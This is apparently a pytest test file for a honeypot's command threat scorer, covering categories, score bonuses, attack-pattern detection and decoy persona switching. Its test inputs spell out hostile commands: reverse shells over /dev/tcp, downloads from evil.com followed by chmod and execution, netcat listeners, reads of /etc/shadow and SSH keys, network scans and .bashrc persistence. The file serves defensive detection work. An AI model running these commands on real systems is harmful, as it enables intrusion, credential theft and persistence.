"""Tests for Threat Scorer -- Sprint 4.

Covers:
    - Every command in EXACT_MATCH_SCORES gets the right category + delta
    - Binary fallback scoring
    - Argument escalator bonuses
    - Score accumulation and capping at 100
    - Threat level thresholds (low/medium/high/critical)
    - Pattern detection across command sequences
    - Persona switch decisions
    - is_first_of_category tracking
"""
from __future__ import annotations

from dataclasses import dataclass, field

import pytest

from honeypot.threat_scorer import (
    ARGUMENT_ESCALATORS,
    BINARY_SCORES,
    EXACT_MATCH_SCORES,
    CommandCategory,
    PatternDetector,
    PersonaSwitchDecider,
    ThreatDecision,
    ThreatLevel,
    ThreatScorer,
)

_Cat = CommandCategory


# ---------------------------------------------------------------------------
# Minimal session stub for tests
# ---------------------------------------------------------------------------

@dataclass
class _StubSession:
    command_history: list = field(default_factory=list)
    threat_score: int = 0
    active_persona: str = "generic_linux"
    persona_switch_count: int = 0
    patterns_detected: set = field(default_factory=set)


def _score(scorer: ThreatScorer, cmd: str, session: _StubSession) -> ThreatDecision:
    """Score a command and apply side-effects to the stub session."""
    decision = scorer.score_command(cmd, session)
    session.threat_score = decision.new_total_score
    session.command_history.append({
        "raw": cmd,
        "category": decision.command_category.value,
    })
    session.patterns_detected.update(decision.patterns_detected)
    return decision


# ===================================================================
# 1. Exact match classification for every entry
# ===================================================================

class TestExactMatchClassification:
    """Verify every EXACT_MATCH_SCORES entry classifies correctly."""

    @pytest.fixture
    def scorer(self):
        return ThreatScorer()

    @pytest.mark.parametrize(
        "cmd,expected_cat,expected_delta",
        [
            (cmd, cat.value, delta)
            for cmd, (cat, delta) in EXACT_MATCH_SCORES.items()
        ],
        ids=list(EXACT_MATCH_SCORES.keys()),
    )
    def test_exact_match(self, scorer, cmd, expected_cat, expected_delta):
        session = _StubSession()
        decision = scorer.score_command(cmd, session)
        assert decision.command_category.value == expected_cat, (
            f"{cmd!r}: expected category {expected_cat}, got {decision.command_category.value}"
        )
        # delta may include argument escalator bonus, so check >= base
        assert decision.score_delta >= expected_delta, (
            f"{cmd!r}: expected delta >= {expected_delta}, got {decision.score_delta}"
        )


# ===================================================================
# 2. Specific high-value commands -- exact assertions
# ===================================================================

class TestKeyCommands:
    """Spot-check that critical commands produce the right values."""

    @pytest.fixture
    def scorer(self):
        return ThreatScorer()

    def test_whoami(self, scorer):
        d = scorer.score_command("whoami", _StubSession())
        assert d.command_category == _Cat.RECONNAISSANCE
        assert d.score_delta == 1

    def test_id(self, scorer):
        d = scorer.score_command("id", _StubSession())
        assert d.command_category == _Cat.RECONNAISSANCE
        assert d.score_delta == 1

    def test_cat_etc_shadow(self, scorer):
        d = scorer.score_command("cat /etc/shadow", _StubSession())
        assert d.command_category == _Cat.PRIVILEGE_ESC
        assert d.score_delta >= 12

    def test_wget(self, scorer):
        d = scorer.score_command("wget http://evil.com/shell.sh", _StubSession())
        assert d.command_category == _Cat.EXFILTRATION
        assert d.score_delta >= 15

    def test_bash_i(self, scorer):
        d = scorer.score_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", _StubSession())
        assert d.command_category == _Cat.EXFILTRATION
        assert d.score_delta >= 22

    def test_ls_is_benign(self, scorer):
        d = scorer.score_command("ls", _StubSession())
        assert d.command_category == _Cat.BENIGN
        assert d.score_delta == 0

    def test_nmap(self, scorer):
        d = scorer.score_command("nmap -sV 192.168.1.0/24", _StubSession())
        assert d.command_category == _Cat.LATERAL_MOVEMENT
        assert d.score_delta >= 18

    def test_sudo_su(self, scorer):
        d = scorer.score_command("sudo su", _StubSession())
        assert d.command_category == _Cat.PRIVILEGE_ESC
        assert d.score_delta >= 12

    def test_cat_etc_passwd(self, scorer):
        d = scorer.score_command("cat /etc/passwd", _StubSession())
        assert d.command_category == _Cat.EXPLORATION
        assert d.score_delta >= 6

    def test_nc(self, scorer):
        d = scorer.score_command("nc -lvp 4444", _StubSession())
        assert d.command_category == _Cat.EXFILTRATION
        assert d.score_delta >= 20


# ===================================================================
# 3. Binary fallback scoring
# ===================================================================

class TestBinaryFallback:
    """Commands not in EXACT_MATCH should fall back to BINARY_SCORES."""

    @pytest.fixture
    def scorer(self):
        return ThreatScorer()

    @pytest.mark.parametrize("binary,expected_cat", [
        ("wget", _Cat.EXFILTRATION),
        ("curl", _Cat.EXFILTRATION),
        ("nmap", _Cat.LATERAL_MOVEMENT),
        ("python3", _Cat.EXFILTRATION),
        ("gcc", _Cat.EXFILTRATION),
        ("sudo", _Cat.PRIVILEGE_ESC),
        ("find", _Cat.EXPLORATION),
        ("ssh", _Cat.LATERAL_MOVEMENT),
    ])
    def test_binary_fallback(self, scorer, binary, expected_cat):
        cmd = f"{binary} --some-unknown-flag value"
        d = scorer.score_command(cmd, _StubSession())
        assert d.command_category == expected_cat

    def test_completely_unknown_command(self, scorer):
        d = scorer.score_command("xyzzy_unknown_binary --foo", _StubSession())
        assert d.command_category == _Cat.BENIGN
        assert d.score_delta == 0


# ===================================================================
# 4. Argument escalator bonuses
# ===================================================================

class TestArgumentEscalators:
    """Verify that dangerous argument substrings add bonus score."""

    @pytest.fixture
    def scorer(self):
        return ThreatScorer()

    def test_etc_shadow_bonus(self, scorer):
        d = scorer.score_command("cat /etc/shadow", _StubSession())
        # base 12 + /etc/shadow escalator 8 = 20
        assert d.score_delta >= 20

    def test_dev_tcp_bonus(self, scorer):
        d = scorer.score_command("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", _StubSession())
        # base 22 (bash -i) + /dev/tcp 15 = 37
        assert d.score_delta >= 37

    def test_ssh_id_rsa_bonus(self, scorer):
        d = scorer.score_command("cat /root/.ssh/id_rsa", _StubSession())
        assert d.score_delta >= 15

    def test_chmod_777_bonus(self, scorer):
        d = scorer.score_command("chmod 777 /tmp/exploit", _StubSession())
        assert d.score_delta >= 8

    def test_no_false_positive_on_harmless(self, scorer):
        d = scorer.score_command("ls /home/user", _StubSession())
        assert d.score_delta == 0


# ===================================================================
# 5. Score accumulation + cap at 100
# ===================================================================

class TestScoreAccumulation:
    """Score must accumulate correctly and never exceed 100."""

    def test_sequential_accumulation(self):
        scorer = ThreatScorer()
        session = _StubSession()

        d1 = _score(scorer, "whoami", session)
        assert d1.new_total_score == 1
        assert d1.previous_score == 0

        d2 = _score(scorer, "id", session)
        assert d2.previous_score == 1
        assert d2.new_total_score == 2

        d3 = _score(scorer, "cat /etc/passwd", session)
        assert d3.previous_score == 2
        assert d3.new_total_score >= 8  # 2 + 6 base

    def test_score_never_exceeds_100(self):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=95)

        d = scorer.score_command(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", session,
        )
        assert d.new_total_score == 100

    def test_benign_commands_dont_increase_score(self):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=30)

        d = scorer.score_command("ls", session)
        assert d.new_total_score == 30
        assert d.score_delta == 0

    def test_ten_command_sequence(self):
        scorer = ThreatScorer()
        session = _StubSession()

        commands = [
            "whoami", "id", "uname -a", "cat /etc/passwd",
            "ps aux", "netstat -an", "cat /etc/shadow",
            "sudo -l", "wget http://evil.com/x", "bash -i",
        ]
        prev = 0
        for cmd in commands:
            d = _score(scorer, cmd, session)
            assert d.new_total_score >= prev, (
                f"Score decreased after {cmd!r}: {prev} -> {d.new_total_score}"
            )
            prev = d.new_total_score

        assert session.threat_score <= 100


# ===================================================================
# 6. Threat level thresholds
# ===================================================================

class TestThreatLevelThresholds:

    @pytest.mark.parametrize("score,expected_level", [
        (0, ThreatLevel.LOW),
        (10, ThreatLevel.LOW),
        (20, ThreatLevel.LOW),
        (21, ThreatLevel.MEDIUM),
        (35, ThreatLevel.MEDIUM),
        (50, ThreatLevel.MEDIUM),
        (51, ThreatLevel.HIGH),
        (65, ThreatLevel.HIGH),
        (80, ThreatLevel.HIGH),
        (81, ThreatLevel.CRITICAL),
        (95, ThreatLevel.CRITICAL),
        (100, ThreatLevel.CRITICAL),
    ])
    def test_threshold_boundaries(self, score, expected_level):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=score)
        d = scorer.score_command("ls", session)
        assert d.threat_level == expected_level


# ===================================================================
# 7. Pattern detection
# ===================================================================

class TestPatternDetection:
    """Each pattern is tested with at least:
    - A realistic trigger sequence
    - A variant sequence (different commands, same pattern)
    - A negative case (similar commands that should NOT trigger)
    - Bonus score verification
    """

    # ---- 1. rapid_recon_burst (bonus 8) -----------------------------------

    def test_rapid_recon_burst_basic(self):
        scorer = ThreatScorer()
        session = _StubSession()
        for cmd in ["whoami", "id", "uname -a", "hostname", "ifconfig"]:
            _score(scorer, cmd, session)
        assert "rapid_recon_burst" in session.patterns_detected

    def test_rapid_recon_burst_variant_sequence(self):
        scorer = ThreatScorer()
        session = _StubSession()
        for cmd in ["env", "ps", "netstat", "df -h", "free -m"]:
            _score(scorer, cmd, session)
        assert "rapid_recon_burst" in session.patterns_detected

    def test_rapid_recon_burst_four_is_not_enough(self):
        scorer = ThreatScorer()
        session = _StubSession()
        for cmd in ["whoami", "id", "uname", "hostname"]:
            _score(scorer, cmd, session)
        assert "rapid_recon_burst" not in session.patterns_detected

    def test_rapid_recon_burst_benign_interleaved_still_fires(self):
        scorer = ThreatScorer()
        session = _StubSession()
        cmds = ["whoami", "ls", "id", "pwd", "uname -a", "echo hi",
                "hostname", "date", "ifconfig"]
        for cmd in cmds:
            _score(scorer, cmd, session)
        assert "rapid_recon_burst" in session.patterns_detected

    def test_rapid_recon_burst_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        base_cmds = ["whoami", "id", "uname -a", "hostname"]
        for cmd in base_cmds:
            _score(scorer, cmd, session)
        score_before = session.threat_score
        d = _score(scorer, "ifconfig", session)
        assert d.score_delta >= 3 + 8  # ifconfig(3) + pattern bonus(8)
        assert "rapid_recon_burst" in d.patterns_detected

    # ---- 2. privilege_escalation_chain (bonus 12) -------------------------

    def test_priv_esc_chain_sudo_then_shadow(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "sudo -l", session)
        d = _score(scorer, "cat /etc/shadow", session)
        assert "privilege_escalation_chain" in session.patterns_detected

    def test_priv_esc_chain_su_then_sudoers(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "su root", session)
        d = _score(scorer, "cat /etc/sudoers", session)
        assert "privilege_escalation_chain" in session.patterns_detected

    def test_priv_esc_chain_sudo_sudo(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "sudo cat /etc/hosts", session)
        d = _score(scorer, "sudo su -", session)
        assert "privilege_escalation_chain" in session.patterns_detected

    def test_priv_esc_chain_single_sudo_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "sudo -l", session)
        _score(scorer, "ls", session)
        _score(scorer, "pwd", session)
        assert "privilege_escalation_chain" not in session.patterns_detected

    def test_priv_esc_chain_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "sudo -l", session)
        score_before = session.threat_score
        d = _score(scorer, "cat /etc/sudoers", session)
        assert d.score_delta >= 12  # base + pattern bonus (12)
        assert "privilege_escalation_chain" in d.patterns_detected

    # ---- 3. credential_harvesting (bonus 15) ------------------------------

    def test_credential_harvest_passwd_then_shadow(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/passwd", session)
        d = _score(scorer, "cat /etc/shadow", session)
        assert "credential_harvesting" in session.patterns_detected

    def test_credential_harvest_shadow_then_passwd(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/shadow", session)
        d = _score(scorer, "cat /etc/passwd", session)
        assert "credential_harvesting" in session.patterns_detected

    def test_credential_harvest_with_gap(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/passwd", session)
        _score(scorer, "ls", session)
        _score(scorer, "whoami", session)
        d = _score(scorer, "cat /etc/shadow", session)
        assert "credential_harvesting" in session.patterns_detected

    def test_credential_harvest_passwd_only_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/passwd", session)
        _score(scorer, "cat /etc/group", session)
        assert "credential_harvesting" not in session.patterns_detected

    def test_credential_harvest_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/passwd", session)
        d = _score(scorer, "cat /etc/shadow", session)
        # shadow base(12) + /etc/shadow escalator(8) + credential_harvesting(15)
        # + possibly privilege_escalation_chain(12) since both are priv indicators
        assert d.score_delta >= 12 + 8 + 15

    # ---- 4. ssh_key_theft_attempt (bonus 12) ------------------------------

    def test_ssh_key_theft_id_rsa(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "ls /root/.ssh", session)
        d = _score(scorer, "cat /root/.ssh/id_rsa", session)
        assert "ssh_key_theft_attempt" in session.patterns_detected

    def test_ssh_key_theft_authorized_keys(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "cat ~/.ssh/authorized_keys", session)
        assert "ssh_key_theft_attempt" in session.patterns_detected

    def test_ssh_key_theft_ed25519(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "cat /home/user/.ssh/id_ed25519", session)
        assert "ssh_key_theft_attempt" in session.patterns_detected

    def test_ssh_dir_ls_alone_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "ls ~/.ssh", session)
        # ls ~/.ssh has .ssh but no id_rsa/id_ed25519/authorized_keys
        assert "ssh_key_theft_attempt" not in session.patterns_detected

    def test_ssh_key_theft_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "cat /root/.ssh/id_rsa", session)
        # base (cat /root/.ssh = 15) + escalators + ssh_key_theft(12)
        assert d.score_delta >= 15 + 12
        assert "ssh_key_theft_attempt" in d.patterns_detected

    # ---- 5. download_and_execute (bonus 20) -------------------------------

    def test_download_execute_wget_chmod(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "wget http://evil.com/shell.sh", session)
        _score(scorer, "chmod +x shell.sh", session)
        d = _score(scorer, "./shell.sh", session)
        assert "download_and_execute" in session.patterns_detected

    def test_download_execute_curl_bash(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "curl -O http://evil.com/payload.py", session)
        d = _score(scorer, "bash payload.py", session)
        assert "download_and_execute" in session.patterns_detected

    def test_download_execute_curl_chmod_755(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "curl -o /tmp/tool http://x.com/tool", session)
        d = _score(scorer, "chmod 755 /tmp/tool", session)
        assert "download_and_execute" in session.patterns_detected

    def test_download_alone_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "wget http://evil.com/shell.sh", session)
        _score(scorer, "ls", session)
        assert "download_and_execute" not in session.patterns_detected

    def test_download_execute_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "wget http://evil.com/shell.sh", session)
        # Pattern fires on chmod +x because it's the first command that
        # completes the download+execute pair.
        d = _score(scorer, "chmod +x shell.sh", session)
        # chmod base(6) + +x escalator(3) + download_and_execute bonus(20)
        assert d.score_delta >= 6 + 3 + 20
        assert "download_and_execute" in d.patterns_detected

    # ---- 6. network_mapping (bonus 10) ------------------------------------

    def test_network_mapping_netstat_arp(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "netstat -an", session)
        d = _score(scorer, "arp -a", session)
        assert "network_mapping" in session.patterns_detected

    def test_network_mapping_ss_arp(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "ss -tulpn", session)
        d = _score(scorer, "arp -a", session)
        assert "network_mapping" in session.patterns_detected

    def test_network_mapping_netstat_alone_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "netstat -an", session)
        _score(scorer, "ls", session)
        assert "network_mapping" not in session.patterns_detected

    def test_network_mapping_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "netstat -an", session)
        score_before = session.threat_score
        d = _score(scorer, "arp -a", session)
        # arp -a base(8) + network_mapping bonus(10)
        assert d.score_delta >= 8 + 10

    # ---- 7. active_network_scan (bonus 18) --------------------------------

    def test_active_scan_nmap(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "nmap -sV 192.168.1.0/24", session)
        assert "active_network_scan" in session.patterns_detected

    def test_active_scan_masscan(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "masscan 10.0.0.0/8 -p80,443", session)
        assert "active_network_scan" in session.patterns_detected

    def test_active_scan_nmap_bonus(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "nmap -sV 192.168.1.0/24", session)
        # nmap base(18) + active_network_scan bonus(18)
        assert d.score_delta >= 18 + 18

    def test_ping_alone_no_active_scan(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "ping 192.168.1.1", session)
        assert "active_network_scan" not in session.patterns_detected

    # ---- 8. persistence_attempt (bonus 15) --------------------------------

    def test_persistence_crontab_bashrc(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "crontab -l", session)
        d = _score(scorer, "echo 'payload' >> ~/.bashrc", session)
        assert "persistence_attempt" in session.patterns_detected

    def test_persistence_cron_d_profile(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "ls /etc/cron.d/", session)
        d = _score(scorer, "cat ~/.profile", session)
        assert "persistence_attempt" in session.patterns_detected

    def test_persistence_init_d_rc_local(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "cat /etc/init.d/networking", session)
        d = _score(scorer, "cat /etc/rc.local", session)
        assert "persistence_attempt" in session.patterns_detected

    def test_persistence_single_command_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "crontab -l", session)
        _score(scorer, "ls", session)
        assert "persistence_attempt" not in session.patterns_detected

    def test_persistence_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "crontab -l", session)
        score_before = session.threat_score
        d = _score(scorer, "echo 'x' >> ~/.bashrc", session)
        # .bashrc bonus via argument escalators + persistence_attempt(15)
        assert d.score_delta >= 15

    # ---- 9. data_staging (bonus 15) ---------------------------------------

    def test_data_staging_find_tar(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "find / -name '*.conf' -size +1M", session)
        d = _score(scorer, "tar czf /tmp/loot.tar.gz /etc/", session)
        assert "data_staging" in session.patterns_detected

    def test_data_staging_find_zip(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "find /home -name '*.csv'", session)
        d = _score(scorer, "zip -r /tmp/data.zip /home/", session)
        assert "data_staging" in session.patterns_detected

    def test_data_staging_find_gzip(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "find / -size +10M", session)
        d = _score(scorer, "gzip /tmp/bigfile", session)
        assert "data_staging" in session.patterns_detected

    def test_data_staging_tar_alone_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "tar czf backup.tar.gz /etc/", session)
        _score(scorer, "ls", session)
        assert "data_staging" not in session.patterns_detected

    def test_data_staging_find_alone_no_trigger(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "find / -name '*.log'", session)
        _score(scorer, "ls", session)
        assert "data_staging" not in session.patterns_detected

    def test_data_staging_bonus_additive(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "find / -name '*.conf' -size +1M", session)
        score_before = session.threat_score
        d = _score(scorer, "tar czf /tmp/loot.tar.gz /etc/", session)
        # tar base(5) + data_staging bonus(15)
        assert d.score_delta >= 5 + 15

    # ---- General pattern mechanics ----------------------------------------

    def test_pattern_fires_only_once(self):
        scorer = ThreatScorer()
        session = _StubSession()
        for cmd in ["whoami", "id", "uname -a", "hostname", "ifconfig"]:
            _score(scorer, cmd, session)
        score_at_trigger = session.threat_score

        for cmd in ["w", "who", "last", "df -h", "free -m"]:
            _score(scorer, cmd, session)
        # Pattern bonus should NOT have been added a second time
        recon_base = 2 + 2 + 3 + 2 + 2  # w(2)+who(2)+last(3)+df-h(2)+free-m(2)
        assert session.threat_score <= score_at_trigger + recon_base + 5

    def test_multiple_patterns_single_session(self):
        scorer = ThreatScorer()
        session = _StubSession()
        # Trigger recon burst
        for cmd in ["whoami", "id", "uname -a", "hostname", "ifconfig"]:
            _score(scorer, cmd, session)
        assert "rapid_recon_burst" in session.patterns_detected

        # Trigger credential harvesting
        _score(scorer, "cat /etc/passwd", session)
        _score(scorer, "cat /etc/shadow", session)
        assert "credential_harvesting" in session.patterns_detected

        # Both should be present
        assert len(session.patterns_detected) >= 2

    def test_empty_command_no_crash(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "", session)
        assert d.score_delta == 0


# ===================================================================
# 8. Persona switch decisions
# ===================================================================

class TestPersonaSwitchDecision:

    def test_switch_to_dev_at_51(self):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=48)
        d = scorer.score_command("cat /etc/passwd", session)
        if d.new_total_score >= 51:
            assert d.trigger_persona_switch is True
            assert d.switch_to_persona == "dev_workstation"

    def test_switch_to_finance_at_81(self):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=75, active_persona="dev_workstation",
                               persona_switch_count=1)
        d = scorer.score_command("cat /etc/shadow", session)
        if d.new_total_score >= 81:
            assert d.trigger_persona_switch is True
            assert d.switch_to_persona == "finance_server"

    def test_no_backward_switch(self):
        decider = PersonaSwitchDecider()
        should, target, _ = decider.should_switch(
            current_persona="finance_server",
            new_score=30,
            switch_count=1,
            patterns=[],
        )
        assert should is False

    def test_max_two_switches(self):
        decider = PersonaSwitchDecider()
        should, target, _ = decider.should_switch(
            current_persona="dev_workstation",
            new_score=90,
            switch_count=2,
            patterns=[],
        )
        assert should is False

    def test_no_switch_below_threshold(self):
        scorer = ThreatScorer()
        session = _StubSession(threat_score=10)
        d = scorer.score_command("whoami", session)
        assert d.trigger_persona_switch is False

    def test_pattern_forces_switch(self):
        decider = PersonaSwitchDecider()
        should, target, reason = decider.should_switch(
            current_persona="generic_linux",
            new_score=30,
            switch_count=0,
            patterns=["download_and_execute"],
        )
        assert should is True
        assert target == "dev_workstation"
        assert "download_and_execute" in reason

    def test_already_at_target_no_switch(self):
        decider = PersonaSwitchDecider()
        should, _, _ = decider.should_switch(
            current_persona="dev_workstation",
            new_score=55,
            switch_count=1,
            patterns=[],
        )
        assert should is False

    def test_score_exactly_51_triggers_dev(self):
        decider = PersonaSwitchDecider()
        should, target, reason = decider.should_switch(
            current_persona="generic_linux",
            new_score=51,
            switch_count=0,
            patterns=[],
        )
        assert should is True
        assert target == "dev_workstation"
        assert "51" in reason

    def test_score_50_does_not_trigger(self):
        decider = PersonaSwitchDecider()
        should, _, _ = decider.should_switch(
            current_persona="generic_linux",
            new_score=50,
            switch_count=0,
            patterns=[],
        )
        assert should is False

    def test_score_exactly_81_triggers_finance(self):
        decider = PersonaSwitchDecider()
        should, target, reason = decider.should_switch(
            current_persona="dev_workstation",
            new_score=81,
            switch_count=1,
            patterns=[],
        )
        assert should is True
        assert target == "finance_server"

    def test_score_80_does_not_trigger_finance(self):
        decider = PersonaSwitchDecider()
        should, _, _ = decider.should_switch(
            current_persona="dev_workstation",
            new_score=80,
            switch_count=1,
            patterns=[],
        )
        assert should is False

    def test_skip_dev_jump_straight_to_finance(self):
        decider = PersonaSwitchDecider()
        should, target, _ = decider.should_switch(
            current_persona="generic_linux",
            new_score=85,
            switch_count=0,
            patterns=[],
        )
        assert should is True
        assert target == "finance_server"

    def test_pattern_forces_dev_to_finance(self):
        decider = PersonaSwitchDecider()
        should, target, reason = decider.should_switch(
            current_persona="dev_workstation",
            new_score=40,
            switch_count=1,
            patterns=["credential_harvesting"],
        )
        assert should is True
        assert target == "finance_server"
        assert "credential_harvesting" in reason

    def test_pattern_on_finance_no_switch(self):
        decider = PersonaSwitchDecider()
        should, _, _ = decider.should_switch(
            current_persona="finance_server",
            new_score=95,
            switch_count=2,
            patterns=["download_and_execute"],
        )
        assert should is False

    def test_non_force_pattern_no_switch(self):
        decider = PersonaSwitchDecider()
        should, _, _ = decider.should_switch(
            current_persona="generic_linux",
            new_score=30,
            switch_count=0,
            patterns=["rapid_recon_burst"],
        )
        assert should is False

    def test_reason_string_populated(self):
        decider = PersonaSwitchDecider()
        _, _, reason = decider.should_switch(
            current_persona="generic_linux",
            new_score=60,
            switch_count=0,
            patterns=[],
        )
        assert reason is not None
        assert len(reason) > 10

    def test_returns_three_tuple(self):
        decider = PersonaSwitchDecider()
        result = decider.should_switch(
            current_persona="generic_linux",
            new_score=10,
            switch_count=0,
            patterns=[],
        )
        assert isinstance(result, tuple)
        assert len(result) == 3
        should, target, reason = result
        assert should is False
        assert target is None
        assert reason is None


# ===================================================================
# 9. is_first_of_category tracking
# ===================================================================

class TestFirstOfCategory:

    def test_first_recon(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "whoami", session)
        assert d.is_first_of_category is True

    def test_second_recon_not_first(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "whoami", session)
        d = _score(scorer, "id", session)
        assert d.is_first_of_category is False

    def test_benign_never_first(self):
        scorer = ThreatScorer()
        session = _StubSession()
        d = _score(scorer, "ls", session)
        assert d.is_first_of_category is False

    def test_first_of_different_category(self):
        scorer = ThreatScorer()
        session = _StubSession()
        _score(scorer, "whoami", session)
        d = _score(scorer, "cat /etc/passwd", session)
        assert d.is_first_of_category is True


# ===================================================================
# 10. ThreatDecision model validation
# ===================================================================

class TestThreatDecisionModel:

    def test_all_fields_populated(self):
        scorer = ThreatScorer()
        d = scorer.score_command("wget http://evil.com/x", _StubSession())
        assert isinstance(d.command_raw, str)
        assert isinstance(d.command_category, CommandCategory)
        assert isinstance(d.score_delta, int)
        assert isinstance(d.previous_score, int)
        assert isinstance(d.new_total_score, int)
        assert isinstance(d.threat_level, ThreatLevel)
        assert isinstance(d.trigger_persona_switch, bool)
        assert isinstance(d.patterns_detected, list)
        assert isinstance(d.is_first_of_category, bool)

    def test_score_delta_non_negative(self):
        scorer = ThreatScorer()
        for cmd in ["ls", "whoami", "cat /etc/shadow", "wget http://x"]:
            d = scorer.score_command(cmd, _StubSession())
            assert d.score_delta >= 0

    def test_new_total_within_bounds(self):
        scorer = ThreatScorer()
        for starting in [0, 50, 95, 100]:
            session = _StubSession(threat_score=starting)
            d = scorer.score_command("bash -i >& /dev/tcp/x/y 0>&1", session)
            assert 0 <= d.new_total_score <= 100


# ===================================================================
# 11. Realistic attack scenario end-to-end
# ===================================================================

class TestRealisticAttackScenario:
    """Simulate a full attacker session and verify the progression."""

    def test_full_attack_progression(self):
        scorer = ThreatScorer()
        session = _StubSession()

        # Phase 1: Recon
        _score(scorer, "whoami", session)
        _score(scorer, "id", session)
        _score(scorer, "uname -a", session)
        _score(scorer, "hostname", session)
        assert session.threat_score <= 20
        assert _score(scorer, "ls", session).threat_level == ThreatLevel.LOW

        # Phase 2: Exploration
        _score(scorer, "cat /etc/passwd", session)
        _score(scorer, "ps aux", session)
        _score(scorer, "netstat -an", session)
        assert session.threat_score > 10

        # Phase 3: Privilege escalation
        _score(scorer, "sudo -l", session)
        d = _score(scorer, "cat /etc/shadow", session)
        assert d.threat_level in (ThreatLevel.MEDIUM, ThreatLevel.HIGH, ThreatLevel.CRITICAL)

        # Phase 4: Exfiltration attempt
        _score(scorer, "wget http://evil.com/rootkit.tar.gz", session)
        d = _score(scorer, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", session)
        assert d.threat_level in (ThreatLevel.HIGH, ThreatLevel.CRITICAL)
        assert session.threat_score > 50

    def test_benign_session_stays_low(self):
        scorer = ThreatScorer()
        session = _StubSession()

        benign = ["ls", "pwd", "cd /tmp", "echo hello", "date", "uptime",
                   "history", "clear", "exit"]
        for cmd in benign:
            _score(scorer, cmd, session)

        assert session.threat_score == 0
        assert _score(scorer, "ls", session).threat_level == ThreatLevel.LOW
